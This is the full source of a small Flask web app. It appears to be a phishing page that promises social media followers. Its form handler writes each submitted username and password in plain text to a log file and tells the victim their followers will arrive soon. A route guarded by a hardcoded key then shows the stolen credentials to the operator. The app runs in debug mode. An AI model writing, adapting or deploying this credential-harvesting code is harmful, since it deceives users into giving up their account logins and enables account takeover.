from flask import Flask, request, render_template
import os

app = Flask(__name__)  

@app.route("/logs/<key>")
def view_logs(key):
    if key != "mysecret123":
        return "Unauthorized"
    with open("log.txt") as f:
        return "<pre>" + f.read() + "</pre>"

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        with open('log.txt', 'a') as f:
            f.write(f'Username: {username} | Password: {password}\n')
        return 'You will started getting your followers soon'
    return render_template('index.html')

if __name__ == '__main__':
    os.makedirs('logs', exist_ok=True)
    app.run(debug=True)
